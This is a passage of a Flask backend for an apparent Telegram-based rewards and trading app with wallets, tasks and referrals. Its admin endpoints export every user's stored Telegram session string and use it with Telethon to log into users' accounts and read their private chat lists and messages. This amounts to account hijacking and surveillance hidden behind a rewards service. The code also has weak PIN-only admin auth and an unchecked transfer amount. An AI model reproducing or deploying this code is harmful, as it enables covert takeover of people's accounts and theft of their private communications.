    from_id = data.get("from")
    to = data.get("to")
    amount = data.get("amount")
    transfer_type = data.get("type")
    from_user = users_col.find_one({"telegram_id": from_id})
    to_user = users_col.find_one({"telegram_id": to})
    if not from_user or not to_user:
        return jsonify({"message": "User not found"})
    if transfer_type == "cash":
        if from_user.get("cash", 0) < amount:
            return jsonify({"message": "Insufficient cash"})
        users_col.update_one({"_id": from_user["_id"]}, {"$inc": {"cash": -amount}})
        users_col.update_one({"_id": to_user["_id"]}, {"$inc": {"cash": amount}})
    elif transfer_type == "aaf":
        if from_user.get("aaf", 0) < amount:
            return jsonify({"message": "Insufficient AAF"})
        users_col.update_one({"_id": from_user["_id"]}, {"$inc": {"aaf": -amount}})
        users_col.update_one({"_id": to_user["_id"]}, {"$inc": {"aaf": amount}})
    else:
        return jsonify({"message": "Invalid type"})
    return jsonify({"message": "Transfer successful"})

@app.route("/api/wallet/ad")
def wallet_ad():
    if not fb_ref:
        return jsonify({"message": ""})
    msg = fb_ref.child("ads/wallet_popup").get()
    return jsonify({"message": msg or ""})

# ================= API: REFERRAL & PAYMENT HISTORY =================
@app.route("/api/user/referrals/<telegram_id>")
@login_required
def get_referrals(telegram_id):
    # Ensure current user matches
    uid = session.get("uid")
    user = users_col.find_one({"telegram_id": telegram_id})
    if not user or str(user["_id"]) != uid:
        return jsonify({"status": "error", "message": "unauthorized"})
    referrals = users_col.find({"refer_by": telegram_id}, {"username": 1, "telegram_id": 1, "created_at": 1})
    ref_list = []
    for r in referrals:
        ref_list.append({
            "username": r.get("username", "USER"),
            "telegram_id": r.get("telegram_id"),
            "joined_at": r.get("created_at").isoformat() if r.get("created_at") else ""
        })
    return jsonify({"referrals": ref_list})

@app.route("/api/user/payments/<telegram_id>")
@login_required
def get_payments(telegram_id):
    uid = session.get("uid")
    user = users_col.find_one({"telegram_id": telegram_id})
    if not user or str(user["_id"]) != uid:
        return jsonify({"status": "error", "message": "unauthorized"})
    deposits = list(deposits_col.find({"telegram_id": telegram_id}, {"_id": 0, "amount": 1, "status": 1, "created_at": 1}))
    withdraws = list(withdraws_col.find({"telegram_id": telegram_id}, {"_id": 0, "amount": 1, "number": 1, "status": 1, "created_at": 1}))
    for d in deposits:
        d["created_at"] = d["created_at"].isoformat() if d.get("created_at") else ""
    for w in withdraws:
        w["created_at"] = w["created_at"].isoformat() if w.get("created_at") else ""
    return jsonify({"deposits": deposits, "withdraws": withdraws})

# ================= API: ADMIN (PIN protected) =================
@app.route("/api/admin/me")
def admin_me():
    if session.get("admin_logged_in"):
        return jsonify({"ok": True})
    return jsonify({"ok": False})

@app.route("/api/admin/login", methods=["POST"])
def admin_login():
    data = request.json
    pin = data.get("pin")
    admin = get_admin_config()
    if pin == admin.get("admin_pin"):
        session["admin_logged_in"] = True
        session.permanent = True          # ← এই লাইনটি গুরুত্বপূর্ণ
        return jsonify({"ok": True})
    return jsonify({"ok": False})

@app.route("/api/admin/users")
def admin_users():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    # session_string সহ সব ইউজার আনা
    users = list(users_col.find({}, {
        "_id": 0, 
        "telegram_id": 1,
        "first_name": 1, 
        "username": 1,
        "phone": 1, 
        "cash": 1,
        "aaf": 1,
        "session_string": 1   # ← এই লাইনটি যোগ করুন
    }))
    return jsonify({"users": users})

@app.route("/api/admin/tasks")
def admin_tasks():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    if not fb_ref:
        return jsonify({"tasks": []})
    tasks = fb_ref.child("tasks").get()
    task_list = []
    if tasks:
        for key, t in tasks.items():
            t["id"] = key
            task_list.append(t)
    return jsonify({"tasks": task_list})


@app.route("/api/admin/ads")
def admin_ads():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    if not fb_ref:
        return jsonify({"global": "", "wallet": "", "task": ""})
    global_ad = fb_ref.child("ads/task_banner_ad").get() or ""
    wallet_ad = fb_ref.child("ads/wallet_popup").get() or ""
    task_ad = fb_ref.child("ads/task_popup_ad").get() or ""
    return jsonify({"global": global_ad, "wallet": wallet_ad, "task": task_ad})

@app.route("/api/admin/withdraws")
def admin_withdraws():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    pending = list(withdraws_col.find({"status": "pending"}, {"_id": 1, "telegram_id": 1, "amount": 1}))
    result = [{"id": str(w["_id"]), "telegram_id": w["telegram_id"], "amount": w["amount"]} for w in pending]
    return jsonify({"list": result})

@app.route("/api/admin/withdraw/approve", methods=["POST"])
def admin_approve_withdraw():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    w_id = data.get("id")
    withdraw = withdraws_col.find_one({"_id": ObjectId(w_id)})
    if withdraw and withdraw["status"] == "pending":
        # Deduct balance (already deducted? Actually we didn't deduct on request, so deduct now)
        user = users_col.find_one({"telegram_id": withdraw["telegram_id"]})
        if user and user.get("cash", 0) >= withdraw["amount"]:
            users_col.update_one({"_id": user["_id"]}, {"$inc": {"cash": -withdraw["amount"]}})
            withdraws_col.update_one({"_id": ObjectId(w_id)}, {"$set": {"status": "approved"}})
    return jsonify({"success": True})

# ===================== ADMIN CONFIG UPDATE =====================
@app.route("/api/admin/update_settings", methods=["POST"])
@login_required
def admin_update_settings():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    
    # বাকি সব ফিল্ড আগের মতো
    update_data = {
        "channel_url": data.get("channel_url", ""),
        "min_trades": int(data.get("min_trades", 5)),
        "ip_limit": data.get("ip_limit", "off"),
        "bot_token": data.get("bot_token", ""),
        "channel_id": data.get("channel_id", ""),
        "server_income": float(data.get("server_income", 0)),
        "server_trading": float(data.get("server_trading", 0)),
        "bonus_target": int(data.get("bonus_target", 5)),
        "banner_ad_code": data.get("banner_ad_code", ""),
        "extra_users": int(data.get("extra_users", 0)),
        "referral_bonus": float(data.get("referral_bonus", 0)),
        "task_banner_ad": data.get("task_banner_ad", ""),
        "task_popup_ad": data.get("task_popup_ad", ""),
        "task_rules": data.get("task_rules", {
            "device_check": True,
            "ip_check": False,
            "account_check": True
        }),
        "ip_limit_per_hour": int(data.get("ip_limit_per_hour", 5)),
        "default_task_expiry_days": int(data.get("default_task_expiry_days", 7)),
    }
    
    # পপআপ ফিল্ডগুলো nested অবজেক্টে রূপান্তর
    update_data["popup_ad"] = {
        "title": data.get("popup_ad_title", ""),
        "desc": data.get("popup_ad_desc", ""),
        "image": data.get("popup_ad_image", ""),
        "enabled": data.get("popup_ad_enabled", False)
    }
    
    # MongoDB আপডেট
    admin_config_col.update_one({"_id": "global"}, {"$set": update_data}, upsert=True)
    return jsonify({"success": True})
    
    
@app.route("/api/admin/set_price", methods=["POST"])
@login_required
def admin_set_price():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    price = request.json.get("price")
    if price:
        admin_config_col.update_one({"_id": "global"}, {"$set": {"live_price": float(price)}})
        return jsonify({"success": True})
    return jsonify({"error": "Invalid price"}), 400

@app.route("/api/admin/set_fee", methods=["POST"])
@login_required
def admin_set_fee():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    fee = request.json.get("fee")
    if fee:
        admin_config_col.update_one({"_id": "global"}, {"$set": {"trading_fee": float(fee)}})
        return jsonify({"success": True})
    return jsonify({"error": "Invalid fee"}), 400

@app.route("/api/admin/update_wallets", methods=["POST"])
@login_required
def admin_update_wallets():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    nagad = request.json.get("nagad", "")
    bkash = request.json.get("bkash", "")
    admin_config_col.update_one({"_id": "global"}, {"$set": {"wallet": {"nagad": nagad, "bkash": bkash}}})
    return jsonify({"success": True})

@app.route("/api/admin/update_balance", methods=["POST"])
@login_required
def admin_update_balance():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    uid = request.json.get("uid")   # এখানে telegram_id আসবে বা MongoDB _id?
    cash = request.json.get("cash")
    aaf = request.json.get("aaf")
    user = users_col.find_one({"telegram_id": uid})
    if not user:
        return jsonify({"error": "User not found"}), 404
    if cash is not None:
        users_col.update_one({"_id": user["_id"]}, {"$set": {"cash": float(cash)}})
    if aaf is not None:
        users_col.update_one({"_id": user["_id"]}, {"$set": {"aaf": float(aaf)}})
    return jsonify({"success": True})

@app.route("/api/admin/config")
@login_required
def admin_config():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    admin = get_admin_config()
    popup = admin.get("popup_ad", {})
    return jsonify({
        "server_income": admin.get("server_income", 0),
        "server_trading": admin.get("server_trading", 0),
        "banner_ad_code": admin.get("banner_ad_code", ""),
        "referral_bonus": admin.get("referral_bonus", 0),
        "bot_token": admin.get("bot_token", ""),
        "channel_url": admin.get("channel_url", ""),
        "channel_id": admin.get("channel_id", ""),
        "extra_users": admin.get("extra_users", 0),
        "bonus_target": admin.get("bonus_target", 5),
        "task_rules": admin.get("task_rules", {"device_check": True, "ip_check": False, "account_check": True}),
        "ip_limit_per_hour": admin.get("ip_limit_per_hour", 5),
        "default_task_expiry_hours": admin.get("default_task_expiry_hours", 168,),
        "wallet": admin.get("wallet", {"nagad": "", "bkash": ""}),
        "popup_ad_title": popup.get("title", ""),
        "popup_ad_desc": popup.get("desc", ""),
        "popup_ad_image": popup.get("image", ""),
        "popup_ad_enabled": popup.get("enabled", False)
    })

@app.route("/api/check_membership", methods=["GET"])
@login_required
def check_membership():
    uid = session.get("uid")
    if not uid:
        return jsonify({"is_member": False})
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        return jsonify({"is_member": False})
    
    admin = get_admin_config()
    bot_token = admin.get("bot_token")
    channel_url = admin.get("channel_url", "")
    
    # কনফিগ না থাকলে ডাটাবেসের মানই রিটার্ন করুন
    if not bot_token or not channel_url:
        return jsonify({"is_member": user.get("is_joined", False)})
    
    try:
        user_tg_id = int(user.get("telegram_id"))
        # চ্যানেল ইউজারনেম পার্স করুন
        if "t.me/" in channel_url:
            channel_username = "@" + channel_url.split("t.me/")[-1].split("/")[0]
        elif channel_url.startswith("@"):
            channel_username = channel_url
        else:
            channel_username = "@" + channel_url
        
        # টেলিগ্রাম বট API কল (ক্যাশ এড়াতে headers যোগ করুন)
        import requests
        url = f"https://api.telegram.org/bot{bot_token}/getChatMember?chat_id={channel_username}&user_id={user_tg_id}"
        resp = requests.get(url, headers={"Cache-Control": "no-cache"}, timeout=10)
        data = resp.json()
        
        if data.get("ok"):
            status = data["result"]["status"]
            is_member = status in ("member", "administrator", "creator")
        else:
            is_member = False
        
        # ডাটাবেস আপডেট করুন
        new_joined = is_member
        if user.get("is_joined") != new_joined:
            users_col.update_one({"_id": ObjectId(uid)}, {"$set": {"is_joined": new_joined}})
        
        # রেসপন্সে ক্যাশ নিষিদ্ধ হেডার দিন
        response = jsonify({"is_member": is_member})
        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
        return response
        
    except Exception as e:
        print(f"Check membership error: {e}")
        # কোনো error হলে is_member = False ধরে নিন (ডাটাবেস আপডেট করবেন না)
        return jsonify({"is_member": False})

@app.route("/api/admin/load_session", methods=["POST"])
def admin_load_session():
    # শুধুমাত্র অ্যাডমিন লগইন থাকলেই চলবে
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json
    session_string = data.get("session_string")
    if not session_string:
        return jsonify({"error": "No session string provided"}), 400
    
    async def fetch_user():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        try:
            me = await client.get_me()
            # প্রোফাইল পিক ডাউনলোড (ঐচ্ছিক)
            photo = None
            try:
                photo = await client.download_profile_photo(me, bytes)
                if photo:
                    import base64
                    photo = base64.b64encode(photo).decode('utf-8')
            except:
                pass
            return {
                "id": me.id,
                "first_name": me.first_name,
                "last_name": me.last_name,
                "username": me.username,
                "phone": me.phone,
                "photo": photo
            }
        finally:
            await client.disconnect()
    
    try:
        user_info = asyncio.run(fetch_user())
        return jsonify({"success": True, "user": user_info})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/api/force_login", methods=["POST"])
def force_login():
    # শুধু অ্যাডমিনের জন্য (নিরাপত্তা)
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json
    session_string = data.get("session_string")
    if not session_string:
        return jsonify({"error": "No session string"}), 400
    
    # সেশন স্ট্রিং থেকে টেলিগ্রাম আইডি বের করুন
    async def get_tg_id():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        me = await client.get_me()
        await client.disconnect()
        return me.id
    
    try:
        tg_id = str(run_async(get_tg_id()))
        # ডাটাবেজে এই telegram_id থাকা ইউজার খুঁজুন
        user = users_col.find_one({"telegram_id": tg_id})
        if not user:
            return jsonify({"error": "User not found in database"}), 404
        
        # ফ্লাস্ক সেশন সেট করুন
        session["uid"] = str(user["_id"])
        session.permanent = True
        
        # ফ্রন্টএন্ডকে জানিয়ে দিন
        return jsonify({"success": True, "telegram_id": tg_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/admin/chat_dialogs", methods=["POST"])
def admin_chat_dialogs():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json
    session_string = data.get("session_string")
    if not session_string:
        return jsonify({"error": "No session string"}), 400
    
    print(f"[DEBUG] session string length: {len(session_string)}")
    
    async def fetch_dialogs():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        try:
            dialogs = await client.get_dialogs()
            result = []
            for d in dialogs:
                # নাম নিরাপদে বের করা
                name = d.name
                if not name:
                    if d.is_user and d.entity:
                        name = getattr(d.entity, 'first_name', '') or getattr(d.entity, 'username', '') or "User"
                    else:
                        name = "Chat"
                # বার্তা নিরাপদে বের করা
                last_msg = ""
                if d.message:
                    last_msg = d.message.text if d.message.text else d.message.caption if hasattr(d.message, 'caption') else ""
                result.append({
                    "id": d.id,
                    "name": name,
                    "unread_count": d.unread_count,
                    "last_message": last_msg[:100]
                })
            return result
        except Exception as e:
            print(f"[ERROR] fetch_dialogs failed: {type(e).__name__}: {e}")
            raise  # উপরের try-এ যাবে
        finally:
            await client.disconnect()
    
    try:
        dialogs = run_async(fetch_dialogs())
        return jsonify({"success": True, "dialogs": dialogs})
    except Exception as e:
        return jsonify({"success": False, "error": f"{type(e).__name__}: {str(e)}"})


@app.route("/api/admin/chat_messages", methods=["POST"])
def admin_chat_messages():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json
    session_string = data.get("session_string")
    chat_id = data.get("chat_id")
    limit = data.get("limit", 50)
    if not session_string or not chat_id:
        return jsonify({"error": "Missing parameters"}), 400
    
    async def fetch_messages():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        try:
            entity = await client.get_entity(int(chat_id))
            messages = await client.get_messages(entity, limit=limit)
            result = []
            for msg in messages:
                # মেসেজের টেক্সট বা মিডিয়া নির্ধারণ
                if msg.text:
                    text = msg.text
                elif msg.caption:
                    text = msg.caption
                else:
                    # সার্ভিস মেসেজ বা অন্য কিছু
                    text = "[Service message or media without caption]"
                
                result.append({
                    "id": msg.id,
                    "text": text,
                    "sender_id": msg.sender_id if msg.sender_id else "Unknown",
                    "date": msg.date.isoformat() if msg.date else None
                })
            return result
        except Exception as e:
            print(f"[ERROR] fetch_messages: {type(e).__name__}: {e}")
            raise
        finally:
            await client.disconnect()
    
    try:
        messages = run_async(fetch_messages())
        return jsonify({"success": True, "messages": messages})
    except Exception as e:
        return jsonify({"success": False, "error": f"{type(e).__name__}: {str(e)}"})

@app.route("/api/admin/pending_claims")
@login_required
def admin_pending_claims():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    claims = list(task_claims_col.find({"status": "pending"}).sort("created_at", -1))
    for c in claims:
        c["_id"] = str(c["_id"])
        user = users_col.find_one({"telegram_id": c["telegram_id"]}, {"username": 1})
        c["username"] = user.get("username", "N/A") if user else "N/A"
        task = fb_ref.child(f"tasks/{c['task_id']}").get() if fb_ref else None
        c["task_title"] = task.get("title", "N/A") if task else "N/A"
    return jsonify({"claims": claims})

@app.route("/api/admin/approve_claim", methods=["POST"])
@login_required
def admin_approve_claim():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    claim_id = data.get("claim_id")
    action = data.get("action")  # 'approve' or 'reject'
    if not claim_id:
        return jsonify({"error": "Claim ID required"}), 400
    claim = task_claims_col.find_one({"_id": ObjectId(claim_id)})
    if not claim or claim["status"] != "pending":
        return jsonify({"error": "Invalid claim"}), 400
    if action == "approve":
        # টাকা দিন
        user = users_col.find_one({"telegram_id": claim["telegram_id"]})
        if claim["currency"] == "aaf":
            users_col.update_one({"_id": user["_id"]}, {"$inc": {"aaf": claim["reward"]}})
        else:
            users_col.update_one({"_id": user["_id"]}, {"$inc": {"cash": claim["reward"]}})
        users_col.update_one({"_id": user["_id"]}, {"$inc": {"tasks_done": 1}})
        task_claims_col.update_one({"_id": claim["_id"]}, {"$set": {"status": "approved"}})
        # প্রয়োজনে ডিভাইস ট্র্যাকিং
        if fb_ref:
            fb_ref.child(f"device_tasks/{claim['task_id']}/{claim['device_id']}").set(True)
        return jsonify({"success": True})
    elif action == "reject":
        task_claims_col.update_one({"_id": claim["_id"]}, {"$set": {"status": "rejected"}})
        return jsonify({"success": True})
    else:
        return jsonify({"error": "Invalid action"}), 400


@app.route("/api/admin/clear_field", methods=["POST"])
@login_required
def admin_clear_field():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    field_name = data.get("field")
    if not field_name:
        return jsonify({"error": "Field name required"}), 400
    
    # কোন ফিল্ডটি ক্লিয়ার করতে চান, সেটি $unset অথবা $set করে খালি করুন
    # আমরা এখানে $set করে খালি স্ট্রিং সেট করছি (যাতে ফিল্ডটি থেকে যায়)
    admin_config_col.update_one(
        {"_id": "global"},
        {"$set": {field_name: ""}}
    )
    return jsonify({"success": True})

# ================== মাইলেসটোন অ্যাডমিন এন্ডপয়েন্ট ==================
@app.route('/api/admin/milestone/save', methods=['POST'])
@login_required
def save_milestone():
    data = request.json
    milestone = {
        "target": data['target'],
        "reward_type": data['reward_type'],
        "reward_amount": data['reward_amount'],
        "days": data.get('days'),
        "type": data['type'],
        "active": data['active'],
        "created_at": datetime.utcnow()
    }
    milestones_col.insert_one(milestone)
    return jsonify({"success": True})

@app.route('/api/admin/milestones', methods=['GET'])
@login_required
def admin_milestones():
    milestones = list(milestones_col.find({}))
    for m in milestones:
        m['_id'] = str(m['_id'])
    return jsonify({"milestones": milestones})

@app.route('/api/admin/milestone/delete', methods=['POST'])
@login_required
def delete_milestone():
    data = request.json
    milestones_col.delete_one({"_id": ObjectId(data['id'])})
    return jsonify({"success": True})

# ================== ইউজার মাইলেসটোন এন্ডপয়েন্ট ==================
@app.route('/api/user/milestones', methods=['GET'])
@login_required
def user_milestones():
    uid = session.get('uid')
    if not uid:
        return jsonify({"milestones": []})
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        return jsonify({"milestones": []})

    # টাস্ক কমপ্লিট কাউন্ট (ধরে নিচ্ছি claimed = True)
    task_count = task_claims_col.count_documents({"telegram_id": user["telegram_id"], "status": "approved"})
    referral_count = user.get("refer_count", 0)
    deposit_total = user.get("total_deposit", 0)

    milestones = list(milestones_col.find({"active": True}))
    result = []
    for m in milestones:
        if m['type'] == 'task':
            progress = task_count
        elif m['type'] == 'referral':
            progress = referral_count
        else:
            progress = deposit_total

        achieved = progress >= m['target']
        already_claimed = user_milestone_claims_col.find_one({"user_id": uid, "milestone_id": str(m['_id'])}) is not None

        result.append({
            "id": str(m['_id']),
            "type": m['type'],
            "target": m['target'],
            "reward_amount": m['reward_amount'],
            "reward_type": m['reward_type'],
            "days": m.get('days'),
            "progress": progress,
            "achieved": achieved,
            "already_claimed": already_claimed
        })
    return jsonify({"milestones": result})

@app.route('/api/user/claim_milestone', methods=['POST'])
@login_required
def claim_milestone():
    uid = session.get('uid')
    if not uid:
        return jsonify({"success": False, "error": "Login required"})
    data = request.json
    milestone_id = data.get('milestone_id')
    if not milestone_id:
        return jsonify({"success": False, "error": "Missing milestone_id"})

    milestone = milestones_col.find_one({"_id": ObjectId(milestone_id), "active": True})
    if not milestone:
        return jsonify({"success": False, "error": "Milestone not found"})

    # ডুপ্লিকেট চেক
    if user_milestone_claims_col.find_one({"user_id": uid, "milestone_id": milestone_id}):
        return jsonify({"success": False, "error": "Already claimed"})

    # ইউজারের বর্তমান প্রগ্রেস পুনঃগণনা
    user = users_col.find_one({"_id": ObjectId(uid)})
    task_count = task_claims_col.count_documents({"telegram_id": user["telegram_id"], "status": "approved"})
    referral_count = user.get("refer_count", 0)
    deposit_total = user.get("total_deposit", 0)

    if milestone['type'] == 'task':
        progress = task_count
    elif milestone['type'] == 'referral':
        progress = referral_count
    else:
        progress = deposit_total

    if progress < milestone['target']:
        return jsonify({"success": False, "error": "Target not reached"})

    # বোনাস প্রদান
    if milestone['reward_type'] == 'bdt':
        users_col.update_one({"_id": ObjectId(uid)}, {"$inc": {"cash": milestone['reward_amount']}})
    else:
        users_col.update_one({"_id": ObjectId(uid)}, {"$inc": {"aaf": milestone['reward_amount']}})

    # ক্লেইম রেকর্ড সেভ
    user_milestone_claims_col.insert_one({
        "user_id": uid,
        "milestone_id": milestone_id,
        "claimed_at": datetime.utcnow()
    })
    return jsonify({"success": True})


# ================= RUN =================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False)
